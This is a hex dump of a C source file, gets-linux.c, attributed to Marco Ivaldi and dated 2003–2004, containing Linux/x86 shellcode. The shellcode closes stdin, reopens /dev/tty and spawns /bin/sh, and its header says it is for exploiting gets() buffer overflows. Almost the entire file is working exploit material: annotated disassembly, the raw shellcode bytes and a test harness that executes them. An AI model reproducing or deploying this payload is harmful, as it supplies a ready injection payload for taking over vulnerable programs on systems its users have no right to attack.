00000000  2f 2a 0d 0a 20 2a 20 24  49 64 3a 20 67 65 74 73  |/*.. * $Id: gets|
00000010  2d 6c 69 6e 75 78 2e 63  2c 76 20 31 2e 33 20 32  |-linux.c,v 1.3 2|
00000020  30 30 34 2f 30 36 2f 30  32 20 31 32 3a 32 32 3a  |004/06/02 12:22:|
00000030  33 30 20 72 61 70 74 6f  72 20 45 78 70 20 24 0d  |30 raptor Exp $.|
00000040  0a 20 2a 0d 0a 20 2a 20  67 65 74 73 2d 6c 69 6e  |. *.. * gets-lin|
00000050  75 78 2e 63 20 2d 20 73  74 64 69 6e 20 72 65 2d  |ux.c - stdin re-|
00000060  6f 70 65 6e 20 73 68 65  6c 6c 63 6f 64 65 20 66  |open shellcode f|
00000070  6f 72 20 4c 69 6e 75 78  2f 78 38 36 0d 0a 20 2a  |or Linux/x86.. *|
00000080  20 43 6f 70 79 72 69 67  68 74 20 28 63 29 20 32  | Copyright (c) 2|
00000090  30 30 33 20 4d 61 72 63  6f 20 49 76 61 6c 64 69  |003 Marco Ivaldi|
000000a0  20 3c 72 61 70 74 6f 72  40 30 78 64 65 61 64 62  | <raptor@0xdeadb|
000000b0  65 65 66 2e 69 6e 66 6f  3e 0d 0a 20 2a 0d 0a 20  |eef.info>.. *.. |
000000c0  2a 20 4c 6f 63 61 6c 20  73 68 65 6c 6c 63 6f 64  |* Local shellcod|
000000d0  65 20 66 6f 72 20 73 74  64 69 6e 20 72 65 2d 6f  |e for stdin re-o|
000000e0  70 65 6e 20 61 6e 64 20  2f 62 69 6e 2f 73 68 20  |pen and /bin/sh |
000000f0  65 78 65 63 2e 20 49 74  20 63 6c 6f 73 65 73 20  |exec. It closes |
00000100  73 74 64 69 6e 20 0d 0a  20 2a 20 64 65 73 63 72  |stdin .. * descr|
00000110  69 70 74 6f 72 20 61 6e  64 20 72 65 2d 6f 70 65  |iptor and re-ope|
00000120  6e 73 20 2f 64 65 76 2f  74 74 79 2c 20 74 68 65  |ns /dev/tty, the|
00000130  6e 20 64 6f 65 73 20 61  6e 20 65 78 65 63 76 65  |n does an execve|
00000140  28 29 20 6f 66 20 2f 62  69 6e 2f 73 68 2e 0d 0a  |() of /bin/sh...|
00000150  20 2a 20 55 73 65 66 75  6c 20 74 6f 20 65 78 70  | * Useful to exp|
00000160  6c 6f 69 74 20 73 6f 6d  65 20 67 65 74 73 28 29  |loit some gets()|
00000170  20 62 75 66 66 65 72 20  6f 76 65 72 66 6c 6f 77  | buffer overflow|
00000180  73 20 69 6e 20 61 6e 20  65 6c 65 67 61 6e 74 20  |s in an elegant |
00000190  77 61 79 2e 2e 2e 0d 0a  20 2a 2f 0d 0a 0d 0a 2f  |way..... */..../|
000001a0  2a 0d 0a 20 2a 20 63 6c  6f 73 65 28 30 29 20 0d  |*.. * close(0) .|
000001b0  0a 20 2a 0d 0a 20 2a 20  38 30 34 39 33 38 30 3a  |. *.. * 8049380:|
000001c0  20 20 20 20 20 20 20 33  31 20 63 30 20 20 20 20  |       31 c0    |
000001d0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
000001e0  6f 72 20 20 20 20 25 65  61 78 2c 25 65 61 78 0d  |or    %eax,%eax.|
000001f0  0a 20 2a 20 38 30 34 39  33 38 32 3a 20 20 20 20  |. * 8049382:    |
00000200  20 20 20 33 31 20 64 62  20 20 20 20 20 20 20 20  |   31 db        |
00000210  20 20 20 20 20 20 20 20  20 20 20 78 6f 72 20 20  |           xor  |
00000220  20 20 25 65 62 78 2c 25  65 62 78 0d 0a 20 2a 20  |  %ebx,%ebx.. * |
00000230  38 30 34 39 33 38 34 3a  20 20 20 20 20 20 20 62  |8049384:       b|
00000240  30 20 30 36 20 20 20 20  20 20 20 20 20 20 20 20  |0 06            |
00000250  20 20 20 20 20 20 20 6d  6f 76 20 20 20 20 24 30  |       mov    $0|
00000260  78 36 2c 25 61 6c 0d 0a  20 2a 20 38 30 34 39 33  |x6,%al.. * 80493|
00000270  38 36 3a 20 20 20 20 20  20 20 63 64 20 38 30 20  |86:       cd 80 |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000290  20 20 69 6e 74 20 20 20  20 24 30 78 38 30 0d 0a  |  int    $0x80..|
000002a0  20 2a 0d 0a 20 2a 20 6f  70 65 6e 28 22 2f 64 65  | *.. * open("/de|
000002b0  76 2f 74 74 79 22 2c 20  4f 5f 52 44 57 52 20 7c  |v/tty", O_RDWR ||
000002c0  20 2e 2e 2e 29 0d 0a 20  2a 0d 0a 20 2a 20 38 30  | ...).. *.. * 80|
000002d0  34 39 33 38 38 3a 20 20  20 20 20 20 20 35 33 20  |49388:       53 |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002f0  20 20 20 20 20 70 75 73  68 20 20 20 25 65 62 78  |     push   %ebx|
00000300  0d 0a 20 2a 20 38 30 34  39 33 38 39 3a 20 20 20  |.. * 8049389:   |
00000310  20 20 20 20 36 38 20 32  66 20 37 34 20 37 34 20  |    68 2f 74 74 |
00000320  37 39 20 20 20 20 20 20  20 20 20 20 70 75 73 68  |79          push|
00000330  20 20 20 24 30 78 37 39  37 34 37 34 32 66 0d 0a  |   $0x7974742f..|
00000340  20 2a 20 38 30 34 39 33  38 65 3a 20 20 20 20 20  | * 804938e:     |
00000350  20 20 36 38 20 32 66 20  36 34 20 36 35 20 37 36  |  68 2f 64 65 76|
00000360  20 20 20 20 20 20 20 20  20 20 70 75 73 68 20 20  |          push  |
00000370  20 24 30 78 37 36 36 35  36 34 32 66 0d 0a 20 2a  | $0x7665642f.. *|
00000380  20 38 30 34 39 33 39 33  3a 20 20 20 20 20 20 20  | 8049393:       |
00000390  38 39 20 65 33 20 20 20  20 20 20 20 20 20 20 20  |89 e3           |
000003a0  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |        mov    %|
000003b0  65 73 70 2c 25 65 62 78  0d 0a 20 2a 20 38 30 34  |esp,%ebx.. * 804|
000003c0  39 33 39 35 3a 20 20 20  20 20 20 20 33 31 20 63  |9395:       31 c|
000003d0  39 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |9               |
000003e0  20 20 20 20 78 6f 72 20  20 20 20 25 65 63 78 2c  |    xor    %ecx,|
000003f0  25 65 63 78 0d 0a 20 2a  20 38 30 34 39 33 39 37  |%ecx.. * 8049397|
00000400  3a 20 20 20 20 20 20 20  36 36 20 62 39 20 31 32  |:       66 b9 12|
00000410  20 32 37 20 20 20 20 20  20 20 20 20 20 20 20 20  | 27             |
00000420  6d 6f 76 20 20 20 20 24  30 78 32 37 31 32 2c 25  |mov    $0x2712,%|
00000430  63 78 0d 0a 20 2a 20 38  30 34 39 33 39 62 3a 20  |cx.. * 804939b: |
00000440  20 20 20 20 20 20 62 30  20 30 35 20 20 20 20 20  |      b0 05     |
00000450  20 20 20 20 20 20 20 20  20 20 20 20 20 20 6d 6f  |              mo|
00000460  76 20 20 20 20 24 30 78  35 2c 25 61 6c 0d 0a 20  |v    $0x5,%al.. |
00000470  2a 20 38 30 34 39 33 39  64 3a 20 20 20 20 20 20  |* 804939d:      |
00000480  20 63 64 20 38 30 20 20  20 20 20 20 20 20 20 20  | cd 80          |
00000490  20 20 20 20 20 20 20 20  20 69 6e 74 20 20 20 20  |         int    |
000004a0  24 30 78 38 30 0d 0a 20  2a 0d 0a 20 2a 20 65 78  |$0x80.. *.. * ex|
000004b0  65 63 76 65 28 22 2f 62  69 6e 2f 73 68 22 2c 20  |ecve("/bin/sh", |
000004c0  5b 22 2f 62 69 6e 2f 73  68 22 5d 2c 20 4e 55 4c  |["/bin/sh"], NUL|
000004d0  4c 29 0d 0a 20 2a 0d 0a  20 2a 20 38 30 34 39 33  |L).. *.. * 80493|
000004e0  39 66 3a 20 20 20 20 20  20 20 33 31 20 63 30 20  |9f:       31 c0 |
000004f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000500  20 20 78 6f 72 20 20 20  20 25 65 61 78 2c 25 65  |  xor    %eax,%e|
00000510  61 78 0d 0a 20 2a 20 38  30 34 39 33 61 31 3a 20  |ax.. * 80493a1: |
00000520  20 20 20 20 20 20 35 30  20 20 20 20 20 20 20 20  |      50        |
00000530  20 20 20 20 20 20 20 20  20 20 20 20 20 20 70 75  |              pu|
00000540  73 68 20 20 20 25 65 61  78 0d 0a 20 2a 20 38 30  |sh   %eax.. * 80|
00000550  34 39 33 61 32 3a 20 20  20 20 20 20 20 36 38 20  |493a2:       68 |
00000560  32 66 20 32 66 20 37 33  20 36 38 20 20 20 20 20  |2f 2f 73 68     |
00000570  20 20 20 20 20 70 75 73  68 20 20 20 24 30 78 36  |     push   $0x6|
00000580  38 37 33 32 66 32 66 0d  0a 20 2a 20 38 30 34 39  |8732f2f.. * 8049|
00000590  33 61 37 3a 20 20 20 20  20 20 20 36 38 20 32 66  |3a7:       68 2f|
000005a0  20 36 32 20 36 39 20 36  65 20 20 20 20 20 20 20  | 62 69 6e       |
000005b0  20 20 20 70 75 73 68 20  20 20 24 30 78 36 65 36  |   push   $0x6e6|
000005c0  39 36 32 32 66 0d 0a 20  2a 20 38 30 34 39 33 61  |9622f.. * 80493a|
000005d0  63 3a 20 20 20 20 20 20  20 38 39 20 65 33 20 20  |c:       89 e3  |
000005e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005f0  20 6d 6f 76 20 20 20 20  25 65 73 70 2c 25 65 62  | mov    %esp,%eb|
00000600  78 0d 0a 20 2a 20 38 30  34 39 33 61 65 3a 20 20  |x.. * 80493ae:  |
00000610  20 20 20 20 20 35 30 20  20 20 20 20 20 20 20 20  |     50         |
00000620  20 20 20 20 20 20 20 20  20 20 20 20 20 70 75 73  |             pus|
00000630  68 20 20 20 25 65 61 78  0d 0a 20 2a 20 38 30 34  |h   %eax.. * 804|
00000640  39 33 61 66 3a 20 20 20  20 20 20 20 35 33 20 20  |93af:       53  |
00000650  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000660  20 20 20 20 70 75 73 68  20 20 20 25 65 62 78 0d  |    push   %ebx.|
00000670  0a 20 2a 20 38 30 34 39  33 62 30 3a 20 20 20 20  |. * 80493b0:    |
00000680  20 20 20 38 39 20 65 31  20 20 20 20 20 20 20 20  |   89 e1        |
00000690  20 20 20 20 20 20 20 20  20 20 20 6d 6f 76 20 20  |           mov  |
000006a0  20 20 25 65 73 70 2c 25  65 63 78 0d 0a 20 2a 20  |  %esp,%ecx.. * |
000006b0  38 30 34 39 33 62 32 3a  20 20 20 20 20 20 20 39  |80493b2:       9|
000006c0  39 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |9               |
000006d0  20 20 20 20 20 20 20 63  6c 74 64 20 20 20 0d 0a  |       cltd   ..|
000006e0  20 2a 20 38 30 34 39 33  62 33 3a 20 20 20 20 20  | * 80493b3:     |
000006f0  20 20 62 30 20 30 62 20  20 20 20 20 20 20 20 20  |  b0 0b         |
00000700  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |          mov   |
00000710  20 24 30 78 62 2c 25 61  6c 0d 0a 20 2a 20 38 30  | $0xb,%al.. * 80|
00000720  34 39 33 62 35 3a 20 20  20 20 20 20 20 63 64 20  |493b5:       cd |
00000730  38 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |80              |
00000740  20 20 20 20 20 69 6e 74  20 20 20 20 24 30 78 38  |     int    $0x8|
00000750  30 0d 0a 20 2a 2f 0d 0a  0d 0a 63 68 61 72 20 73  |0.. */....char s|
00000760  63 5b 5d 20 3d 20 0d 0a  22 5c 78 33 31 5c 78 63  |c[] = .."\x31\xc|
00000770  30 5c 78 33 31 5c 78 64  62 5c 78 62 30 5c 78 30  |0\x31\xdb\xb0\x0|
00000780  36 5c 78 63 64 5c 78 38  30 22 0d 0a 22 5c 78 35  |6\xcd\x80".."\x5|
00000790  33 5c 78 36 38 2f 74 74  79 5c 78 36 38 2f 64 65  |3\x68/tty\x68/de|
000007a0  76 5c 78 38 39 5c 78 65  33 5c 78 33 31 5c 78 63  |v\x89\xe3\x31\xc|
000007b0  39 5c 78 36 36 5c 78 62  39 5c 78 31 32 5c 78 32  |9\x66\xb9\x12\x2|
000007c0  37 5c 78 62 30 5c 78 30  35 5c 78 63 64 5c 78 38  |7\xb0\x05\xcd\x8|
000007d0  30 22 0d 0a 22 5c 78 33  31 5c 78 63 30 5c 78 35  |0".."\x31\xc0\x5|
000007e0  30 5c 78 36 38 2f 2f 73  68 5c 78 36 38 2f 62 69  |0\x68//sh\x68/bi|
000007f0  6e 5c 78 38 39 5c 78 65  33 5c 78 35 30 5c 78 35  |n\x89\xe3\x50\x5|
00000800  33 5c 78 38 39 5c 78 65  31 5c 78 39 39 5c 78 62  |3\x89\xe1\x99\xb|
00000810  30 5c 78 30 62 5c 78 63  64 5c 78 38 30 22 3b 0d  |0\x0b\xcd\x80";.|
00000820  0a 0d 0a 6d 61 69 6e 28  29 0d 0a 7b 0d 0a 09 69  |...main()..{...i|
00000830  6e 74 20 28 2a 66 29 28  29 20 3d 20 28 69 6e 74  |nt (*f)() = (int|
00000840  20 28 2a 29 28 29 29 73  63 3b 20 66 28 29 3b 0d  | (*)())sc; f();.|
00000850  0a 7d                                             |.}|
00000852
